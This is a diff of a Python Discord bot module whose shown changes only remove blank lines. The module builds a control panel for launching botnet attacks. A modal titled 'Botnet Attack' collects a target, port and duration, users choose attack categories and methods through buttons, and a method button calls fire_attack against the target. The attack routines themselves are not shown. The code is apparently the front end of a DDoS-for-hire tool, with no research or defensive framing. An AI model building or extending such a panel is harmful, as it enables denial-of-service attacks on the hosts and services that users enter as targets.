@@ -9,11 +9,9 @@ from config import (
 # ── V2 flags ──
 V2_FLAGS = discord.MessageFlags.components_v2
 
-
 def _wrap(view) -> dict:
     """ห่อ LayoutView เป็น dict สำหรับ **kwargs"""
     return {"view": view, "flags": V2_FLAGS}
-
 
 # ═══════════════════════════════════════════
 # Panel
@@ -36,7 +34,6 @@ def build_panel() -> dict:
     v.add_item(c)
     return _wrap(v)
 
-
 class PanelButton(ui.Button):
     def __init__(self):
         super().__init__(label="", style=discord.ButtonStyle.secondary,
@@ -45,7 +42,6 @@ class PanelButton(ui.Button):
     async def callback(self, interaction):
         from bot import open_attack_modal
         await open_attack_modal(interaction)
-
 
 # ═══════════════════════════════════════════
 # Modal
@@ -62,7 +58,6 @@ class AttackModal(ui.Modal, title="Botnet Attack"):
     async def on_submit(self, interaction):
         from bot import handle_attack_submit
         await handle_attack_submit(interaction, self)
-
 
 # ═══════════════════════════════════════════
 # Category
@@ -85,7 +80,6 @@ class CatButton(ui.Button):
         from bot import show_method_panel
         await show_method_panel(interaction, self.key,
                                 self.target, self.port, self.dur)
-
 
 def build_category_view(uid, target, port, dur) -> dict:
     v = ui.LayoutView(timeout=300)
@@ -114,7 +108,6 @@ def build_category_view(uid, target, port, dur) -> dict:
     v.add_item(c)
     return _wrap(v)
 
-
 # ═══════════════════════════════════════════
 # Method
 # ═══════════════════════════════════════════
@@ -137,7 +130,6 @@ class MethodButton(ui.Button):
         await fire_attack(interaction, self.method, self.target,
                           self.port, self.dur)
 
-
 def _rows(methods, emoji_map, uid, target, port, dur, style, per=5):
     rows = []
     for i in range(0, len(methods), per):
@@ -147,7 +139,6 @@ def _rows(methods, emoji_map, uid, target, port, dur, style, per=5):
                                        target, port, dur, style))
         rows.append(row)
     return rows
-
 
 def build_method_view(cat, uid, target, port, dur) -> dict:
     v = ui.LayoutView(timeout=300)
@@ -178,7 +169,6 @@ def build_method_view(cat, uid, target, port, dur) -> dict:
         c.add_item(r)
     v.add_item(c)
     return _wrap(v)
-
 
 # ═══════════════════════════════════════════
 # Running
